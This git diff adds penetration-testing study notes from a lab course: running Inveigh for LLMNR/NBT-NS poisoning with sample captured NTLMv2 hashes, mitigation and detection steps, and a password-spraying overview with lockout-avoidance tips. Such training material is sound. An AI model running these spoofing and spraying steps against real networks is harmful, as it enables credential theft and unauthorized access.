@@ -337,3 +337,164 @@ Sure thing! Here is a more detailed version, including commands and additional i
 - **Further Use:** Utilize cleartext passwords for initial foothold or expanded access within the domain.
 
 ---
+# LLMNR/NBT-NS Poisoning - from Windows
+### Overview
+Inveigh is a tool written in PowerShell and C# that can listen to multiple protocols, including LLMNR, DNS, mDNS, NBNS, and more. It's useful for capturing credentials on Windows hosts.
+
+### Using the PowerShell Version
+
+1. **Import the module and list parameters:**
+   ```powershell
+   PS C:\htb> Import-Module .\Inveigh.ps1
+   PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
+   ```
+
+2. **Start Inveigh with LLMNR and NBNS spoofing:**
+   ```powershell
+   PS C:\htb> Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+   ```
+
+### Using the C# Version (InveighZero)
+The C# version is actively maintained and combines original and ported code. It's available pre-compiled in the C:\Tools folder, but it's good practice to compile it yourself using Visual Studio.
+
+1. **Run the C# executable:**
+   ```powershell
+   PS C:\htb> .\Inveigh.exe
+   ```
+
+2. **View help options:**
+   ```
+   C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
+   ```
+
+### Useful Console Commands
+
+- **Get queued console output:**
+  ```plaintext
+  GET CONSOLE
+  ```
+
+- **Get captured NTLMv2 hashes (unique):**
+  ```plaintext
+  GET NTLMV2UNIQUE
+  ```
+
+- **Get captured NTLMv2 usernames:**
+  ```plaintext
+  GET NTLMV2USERNAMES
+  ```
+
+### Example Output
+
+#### Unique NTLMv2 Hashes
+```plaintext
+backupagent::INLANEFREIGHT:B5013246091943D7:...
+forend::INLANEFREIGHT:32FD89BD78804B04:...
+...
+```
+
+#### NTLMv2 Usernames
+```plaintext
+IP Address    Host            Username                     Challenge
+172.16.5.125  ACADEMY-EA-FILE  INLANEFREIGHT\backupagent    B5013246091943D7
+172.16.5.125  ACADEMY-EA-FILE  INLANEFREIGHT\forend         32FD89BD78804B04
+...
+```
+
+---
+
+## Remediation
+
+### Mitre ATT&CK Reference
+- **ID:** T1557.001
+- **Technique:** Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
+
+### Mitigation Steps
+To prevent LLMNR and NBT-NS spoofing attacks, it's crucial to disable these protocols cautiously after testing their impact on your network.
+
+1. **Disable LLMNR via Group Policy:**
+   - Navigate to: `Computer Configuration --> Administrative Templates --> Network --> DNS Client`
+   - Enable: **Turn OFF Multicast Name Resolution**
+
+2. **Disable NBT-NS Locally:**
+   - Open **Network and Sharing Center** under **Control Panel**
+   - Click **Change adapter settings**
+   - Right-click on the adapter, view properties
+   - Select **Internet Protocol Version 4 (TCP/IPv4)**
+   - Click **Properties** -> **Advanced** -> **WINS** tab
+   - Select **Disable NetBIOS over TCP/IP**
+
+3. **Disable NBT-NS via PowerShell Script:**
+   - Script to disable NetBIOS:
+     ```powershell
+     $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
+     Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
+     ```
+   - Add the script to **Startup** in Local Group Policy:
+     - Navigate to: `Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup`
+     - Add the PowerShell script
+
+4. **Push Out GPO Script Domain-Wide:**
+   - Create a GPO using **Group Policy Management**
+   - Host the script on the **SYSVOL** share and call it via UNC path:
+     ```
+     \\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+     ```
+   - Apply GPO to specific OUs and ensure the script runs on reboot
+
+5. **Additional Mitigations:**
+   - Filter network traffic to block LLMNR/NetBIOS
+   - Enable SMB Signing to prevent NTLM relay attacks
+   - Use network intrusion detection/prevention systems
+   - Implement network segmentation
+
+## Detection
+
+### Detecting Attack Behavior
+1. **Inject LLMNR and NBT-NS Requests:**
+   - Inject requests for non-existent hosts across subnets
+   - Alert if any responses are received
+
+2. **Monitor Network Traffic:**
+   - Ports: UDP 5355 (LLMNR) and UDP 137 (NetBIOS)
+
+3. **Monitor Event IDs:**
+   - Event ID 4697
+   - Event ID 7045
+
+4. **Monitor Registry Key:**
+   - Registry: `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient`
+   - DWORD value `EnableMulticast`, where `0` indicates LLMNR is disabled
+
+---
+# Password Spraying Overview
+
+**Password spraying** is trying a common password with a list of usernames to gain access without triggering account lockouts.
+
+#### Key Points:
+- **Method:** Use one common password across many usernames.
+- **Purpose:** Gain initial access or a foothold in a network.
+- **Precaution:** Introduce delays to avoid account lockouts.
+
+### Scenarios
+
+1. **Example 1:**
+   - **Method:** Combined GitHub and LinkedIn username lists.
+   - **Tool:** Kerbrute.
+   - **Outcome:** Gained low-privileged access, then escalated using `BloodHound`.
+
+2. **Example 2:**
+   - **Method:** Scraped PDF metadata for username patterns.
+   - **Outcome:** Enumerated all domain users, gained passwords, and compromised the domain.
+
+### Considerations
+
+- **Risk of Lockouts:** Avoid frequent attempts to prevent account lockouts.
+- **Internal Use:** Use for lateral movement within a network.
+- **Password Policy:** Know the domain's policy to minimize risks.
+
+### Practical Tips:
+
+- **Delays:** Wait hours between attempts.
+- **Client Communication:** Clarify password policies.
+- **Enumeration:** Use provided accounts to discover password policies.
